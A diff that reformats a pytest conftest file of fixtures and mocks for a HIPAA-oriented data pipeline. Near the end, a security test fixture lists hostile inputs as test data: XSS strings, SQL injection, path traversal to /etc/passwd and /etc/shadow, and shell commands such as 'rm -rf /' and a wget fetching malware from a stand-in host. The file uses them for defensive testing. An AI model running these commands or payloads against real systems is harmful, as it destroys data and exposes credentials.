@@ -4,10 +4,11 @@ Test Configuration and Fixtures for Pipeline Communication Tests.
 This module provides pytest fixtures and configuration for testing the
 six-stage pipeline communication system with HIPAA++ compliance.
 """
+
 import asyncio
 import os
 import time
-from datetime import datetime, timezone
+from datetime import UTC, datetime
 from typing import Any
 from unittest.mock import AsyncMock, Mock
 
@@ -66,56 +67,51 @@ def test_config():
                 "max_connections": 10,
                 "min_connections": 2,
                 "connection_timeout": 5.0,
-                "socket_timeout": 5.0
+                "socket_timeout": 5.0,
             },
             "key_prefix": "test_pipeline",
             "state_ttl_seconds": 3600,
-            "event_ttl": 3600
-        },
-        "event_bus": {
             "event_ttl": 3600,
-            "guaranteed_delivery": True,
-            "retry_attempts": 3,
-            "retry_delay": 1.0
         },
+        "event_bus": {"event_ttl": 3600, "guaranteed_delivery": True, "retry_attempts": 3, "retry_delay": 1.0},
         "pipeline": {
             "max_concurrent_executions": 10,
             "stage_timeout_seconds": 300,
             "overall_timeout_seconds": 1800,
             "quality_threshold": 0.8,
-            "bias_detection_enabled": True
+            "bias_detection_enabled": True,
         },
         "performance": {
             "metrics_retention_hours": 24,
             "threshold_check_interval": 60,
             "performance_window_size": 1000,
-            "sub_50ms_target": 0.95  # 95% of operations should be under 50ms
+            "sub_50ms_target": 0.95,  # 95% of operations should be under 50ms
         },
         "security": {
             "encryption_enabled": True,
             "audit_logging_enabled": True,
             "rate_limiting_enabled": True,
-            "max_requests_per_minute": 100
+            "max_requests_per_minute": 100,
         },
         "bias_detection": {
             "enabled": True,
             "threshold": 0.3,
             "confidence_threshold": 0.7,
-            "real_time_monitoring": True
+            "real_time_monitoring": True,
         },
         "error_recovery": {
             "max_retry_attempts": 3,
             "retry_delay_seconds": 2.0,
             "exponential_backoff": True,
             "circuit_breaker_threshold": 5,
-            "circuit_breaker_timeout": 60
+            "circuit_breaker_timeout": 60,
         },
         "graceful_degradation": {
             "enabled": True,
             "degradation_levels": ["normal", "reduced", "minimal", "emergency"],
             "circuit_breaker_enabled": True,
-            "fallback_enabled": True
-        }
+            "fallback_enabled": True,
+        },
     }
 
 
@@ -181,14 +177,10 @@ def sample_pipeline_context():
         execution_mode="standard",
         quality_threshold=0.8,
         enable_bias_detection=True,
-        start_time=datetime.now(timezone.utc),
+        start_time=datetime.now(UTC),
         current_stage="ingestion",
         stage_results={},
-        metadata={
-            "test_run": True,
-            "environment": "test",
-            "version": "1.0.0"
-        }
+        metadata={"test_run": True, "environment": "test", "version": "1.0.0"},
     )
 
 
@@ -202,13 +194,9 @@ def sample_event_message():
             "stage": "validation",
             "progress": 50.0,
             "status": "running",
-            "timestamp": datetime.now(timezone.utc).isoformat()
+            "timestamp": datetime.now(UTC).isoformat(),
         },
-        metadata={
-            "source": "test",
-            "priority": "normal",
-            "correlation_id": "test_correlation_123"
-        }
+        metadata={"source": "test", "priority": "normal", "correlation_id": "test_correlation_123"},
     )
 
 
@@ -224,7 +212,7 @@ def sample_bias_metrics():
         compliance_status="compliant",
         threshold_exceeded=False,
         recommendations=["Continue monitoring", "No immediate action required"],
-        timestamp=datetime.now(timezone.utc)
+        timestamp=datetime.now(UTC),
     )
 
 
@@ -236,16 +224,17 @@ def sample_performance_metric():
         execution_id="test_execution_123",
         value=25.0,
         unit="milliseconds",
-        timestamp=datetime.now(timezone.utc),
+        timestamp=datetime.now(UTC),
         threshold=50.0,
         threshold_exceeded=False,
-        metadata={"stage": "validation", "dataset_size": 1000}
+        metadata={"stage": "validation", "dataset_size": 1000},
     )
 
 
 @pytest.fixture
 def mock_handler():
     """Create a mock event handler for testing."""
+
     class MockHandler:
         def __init__(self, handler_func=None):
             self.handler_func = handler_func or self._default_handler
@@ -255,7 +244,7 @@ def mock_handler():
         async def _default_handler(self, event: EventMessage) -> dict[str, Any]:
             self.call_count += 1
             self.received_events.append(event)
-            return {"handled": True, "timestamp": datetime.now(timezone.utc).isoformat()}
+            return {"handled": True, "timestamp": datetime.now(UTC).isoformat()}
 
         async def handle(self, event: EventMessage) -> dict[str, Any]:
             return await self.handler_func(event)
@@ -266,6 +255,7 @@ def mock_handler():
 @pytest.fixture
 def mock_stage_coordinator():
     """Create a mock stage coordinator for testing."""
+
     class MockStageCoordinator:
         def __init__(self, stage_name="test_stage"):
             self.stage_name = stage_name
@@ -284,7 +274,7 @@ def mock_stage_coordinator():
                 "status": "completed",
                 "result": {"processed_items": 100, "quality_score": 0.9},
                 "execution_time_ms": 10.0,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(UTC).isoformat(),
             }
 
         async def validate_stage_input(self, _context: PipelineContext) -> bool:
@@ -299,6 +289,7 @@ def mock_stage_coordinator():
 @pytest.fixture
 def mock_bias_service():
     """Create a mock bias detection service for testing."""
+
     class MockBiasService:
         def __init__(self):
             self.analyze_count = 0
@@ -318,7 +309,7 @@ def mock_bias_service():
                 compliance_status="compliant" if bias_score < 0.2 else "warning",
                 threshold_exceeded=bias_score > 0.2,
                 recommendations=["Monitor closely"] if bias_score > 0.2 else ["Continue"],
-                timestamp=datetime.now(timezone.utc)
+                timestamp=datetime.now(UTC),
             )
 
         async def get_real_time_alerts(self) -> list[dict[str, Any]]:
@@ -327,8 +318,8 @@ def mock_bias_service():
                     "alert_type": "bias_threshold_exceeded",
                     "bias_score": 0.35,
                     "threshold": 0.3,
-                    "timestamp": datetime.now(timezone.utc).isoformat(),
-                    "stage": "validation"
+                    "timestamp": datetime.now(UTC).isoformat(),
+                    "stage": "validation",
                 }
             ]
 
@@ -338,6 +329,7 @@ def mock_bias_service():
 @pytest.fixture
 def mock_performance_service():
     """Create a mock performance monitoring service for testing."""
+
     class MockPerformanceService:
         def __init__(self):
             self.metrics = []
@@ -350,12 +342,14 @@ def mock_performance_service():
             violations = []
             for metric in self.metrics:
                 if metric.threshold_exceeded:
-                    violations.append({
-                        "metric_name": metric.metric_name,
-                        "current_value": metric.value,
-                        "threshold": metric.threshold,
-                        "violation_severity": "high" if metric.value > metric.threshold * 1.5 else "medium"
-                    })
+                    violations.append(
+                        {
+                            "metric_name": metric.metric_name,
+                            "current_value": metric.value,
+                            "threshold": metric.threshold,
+                            "violation_severity": "high" if metric.value > metric.threshold * 1.5 else "medium",
+                        }
+                    )
             return violations
 
         async def get_performance_summary(self, execution_id: str) -> dict[str, Any]:
@@ -371,7 +365,8 @@ def mock_performance_service():
                 "min_response_time_ms": min(m.value for m in execution_metrics),
                 "max_response_time_ms": max(m.value for m in execution_metrics),
                 "threshold_violations": sum(1 for m in execution_metrics if m.threshold_exceeded),
-                "sub_50ms_compliance_rate": sum(1 for m in execution_metrics if m.value <= 50.0) / len(execution_metrics)
+                "sub_50ms_compliance_rate": sum(1 for m in execution_metrics if m.value <= 50.0)
+                / len(execution_metrics),
             }
 
     return MockPerformanceService()
@@ -380,6 +375,7 @@ def mock_performance_service():
 @pytest.fixture
 def mock_web_socket_manager():
     """Create a mock WebSocket manager for testing."""
+
     class MockWebSocketManager:
         def __init__(self):
             self.connections = {}
@@ -394,11 +390,9 @@ def mock_web_socket_manager():
 
         async def send_message(self, client_id: str, message: dict[str, Any]):
             if client_id in self.connections:
-                self.messages_sent.append({
-                    "client_id": client_id,
-                    "message": message,
-                    "timestamp": datetime.now(timezone.utc).isoformat()
-                })
+                self.messages_sent.append(
+                    {"client_id": client_id, "message": message, "timestamp": datetime.now(UTC).isoformat()}
+                )
                 return True
             return False
 
@@ -415,6 +409,7 @@ def mock_web_socket_manager():
 @pytest.fixture
 def mock_flask_app():
     """Create a mock Flask app for testing."""
+
     class MockFlaskApp:
         def __init__(self):
             self.routes = {}
@@ -423,11 +418,9 @@ def mock_flask_app():
 
         def route(self, path, methods=None):
             def decorator(func):
-                self.routes[path] = {
-                    "function": func,
-                    "methods": methods or ["GET"]
-                }
+                self.routes[path] = {"function": func, "methods": methods or ["GET"]}
                 return func
+
             return decorator
 
         def before_request(self, func):
@@ -475,24 +468,21 @@ def mock_flask_app():
 @pytest.fixture
 def test_data_generator():
     """Create test data generator for various scenarios."""
+
     class TestDataGenerator:
         @staticmethod
         def generate_dataset_metadata(size: int = 1000) -> dict[str, Any]:
             return {
                 "dataset_id": f"test_dataset_{int(time.time())}",
                 "size": size,
-                "created_at": datetime.now(timezone.utc).isoformat(),
-                "last_modified": datetime.now(timezone.utc).isoformat(),
+                "created_at": datetime.now(UTC).isoformat(),
+                "last_modified": datetime.now(UTC).isoformat(),
                 "format": "json",
                 "schema": {
                     "fields": ["id", "text", "label", "timestamp"],
-                    "types": ["integer", "string", "string", "datetime"]
+                    "types": ["integer", "string", "string", "datetime"],
                 },
-                "quality_metrics": {
-                    "completeness": 0.95,
-                    "accuracy": 0.92,
-                    "consistency": 0.88
-                }
+                "quality_metrics": {"completeness": 0.95, "accuracy": 0.92, "consistency": 0.88},
             }
 
         @staticmethod
@@ -503,11 +493,7 @@ def test_data_generator():
                 "execution_mode": "standard",
                 "quality_threshold": 0.8,
                 "enable_bias_detection": True,
-                "metadata": {
-                    "test_run": True,
-                    "environment": "test",
-                    "version": "1.0.0"
-                }
+                "metadata": {"test_run": True, "environment": "test", "version": "1.0.0"},
             }
 
         @staticmethod
@@ -515,19 +501,11 @@ def test_data_generator():
             return {
                 "stage_name": stage_name,
                 "status": status,
-                "start_time": datetime.now(timezone.utc).isoformat(),
-                "end_time": datetime.now(timezone.utc).isoformat(),
+                "start_time": datetime.now(UTC).isoformat(),
+                "end_time": datetime.now(UTC).isoformat(),
                 "duration_ms": 100.0,
-                "result": {
-                    "processed_items": 100,
-                    "quality_score": 0.9,
-                    "errors": [],
-                    "warnings": []
-                },
-                "metadata": {
-                    "stage_version": "1.0.0",
-                    "worker_id": "test_worker_123"
-                }
+                "result": {"processed_items": 100, "quality_score": 0.9, "errors": [], "warnings": []},
+                "metadata": {"stage_version": "1.0.0", "worker_id": "test_worker_123"},
             }
 
         @staticmethod
@@ -541,23 +519,25 @@ def test_data_generator():
                 compliance_status="compliant" if bias_score < 0.2 else "warning",
                 threshold_exceeded=bias_score > 0.2,
                 recommendations=["Monitor closely"] if bias_score > 0.2 else ["Continue"],
-                timestamp=datetime.now(timezone.utc)
+                timestamp=datetime.now(UTC),
             )
 
         @staticmethod
         def generate_performance_metrics(execution_id: str, num_metrics: int = 5) -> list[PerformanceMetric]:
             metrics = []
             for i in range(num_metrics):
-                metrics.append(PerformanceMetric(
-                    metric_name=f"test_metric_{i}",
-                    execution_id=execution_id,
-                    value=float(i * 10),
-                    unit="milliseconds",
-                    timestamp=datetime.now(timezone.utc),
-                    threshold=50.0,
-                    threshold_exceeded=(i * 10) > 50.0,
-                    metadata={"test_index": i}
-                ))
+                metrics.append(
+                    PerformanceMetric(
+                        metric_name=f"test_metric_{i}",
+                        execution_id=execution_id,
+                        value=float(i * 10),
+                        unit="milliseconds",
+                        timestamp=datetime.now(UTC),
+                        threshold=50.0,
+                        threshold_exceeded=(i * 10) > 50.0,
+                        metadata={"test_index": i},
+                    )
+                )
             return metrics
 
     return TestDataGenerator()
@@ -566,6 +546,7 @@ def test_data_generator():
 @pytest.fixture
 def performance_timer():
     """Create performance timer for measuring execution times."""
+
     class PerformanceTimer:
         def __init__(self):
             self.start_time = None
@@ -605,15 +586,10 @@ def performance_timer():
 @pytest.fixture
 def mock_logger():
     """Create a mock logger for testing."""
+
     class MockLogger:
         def __init__(self):
-            self.logs = {
-                "debug": [],
-                "info": [],
-                "warning": [],
-                "error": [],
-                "critical": []
-            }
+            self.logs = {"debug": [], "info": [], "warning": [], "error": [], "critical": []}
 
         def debug(self, message: str, **kwargs):
             self.logs["debug"].append({"message": message, "kwargs": kwargs})
@@ -659,7 +635,7 @@ def test_database():
         "password": None,
         "ssl": False,
         "socket_timeout": 5.0,
-        "connection_pool_size": 10
+        "connection_pool_size": 10,
     }
 
 
@@ -686,18 +662,10 @@ def test_environment():
 # Pytest configuration
 def pytest_configure(config):
     """Configure pytest for async testing."""
-    config.addinivalue_line(
-        "markers", "asyncio: mark test as async"
-    )
-    config.addinivalue_line(
-        "markers", "performance: mark test as performance-critical"
-    )
-    config.addinivalue_line(
-        "markers", "security: mark test as security-sensitive"
-    )
-    config.addinivalue_line(
-        "markers", "hipaa: mark test as HIPAA compliance test"
-    )
+    config.addinivalue_line("markers", "asyncio: mark test as async")
+    config.addinivalue_line("markers", "performance: mark test as performance-critical")
+    config.addinivalue_line("markers", "security: mark test as security-sensitive")
+    config.addinivalue_line("markers", "hipaa: mark test as HIPAA compliance test")
 
 
 def pytest_collection_modifyitems(_config, items):
@@ -735,7 +703,7 @@ def performance_thresholds():
         "bias_detection_ms": 50.0,
         "progress_update_ms": 50.0,
         "pipeline_stage_ms": 5000.0,  # 5 seconds per stage
-        "overall_pipeline_ms": 30000.0  # 30 seconds total
+        "overall_pipeline_ms": 30000.0,  # 30 seconds total
     }
 
 
@@ -747,21 +715,9 @@ def security_test_cases():
         "xss_payloads": [
             '<script>alert("xss")</script>',
             'javascript:alert("xss")',
-            '<img src="x" onerror="alert(\'xss\')">'
+            '<img src="x" onerror="alert(\'xss\')">',
         ],
-        "sql_injection_payloads": [
-            "'; DROP TABLE users; --",
-            "' OR '1'='1",
-            "UNION SELECT * FROM users"
-        ],
-        "command_injection_payloads": [
-            "rm -rf /",
-            "cat /etc/passwd",
-            "wget malicious.com/malware.sh"
-        ],
-        "path_traversal_payloads": [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "/etc/shadow"
-        ]
+        "sql_injection_payloads": ["'; DROP TABLE users; --", "' OR '1'='1", "UNION SELECT * FROM users"],
+        "command_injection_payloads": ["rm -rf /", "cat /etc/passwd", "wget malicious.com/malware.sh"],
+        "path_traversal_payloads": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "/etc/shadow"],
     }
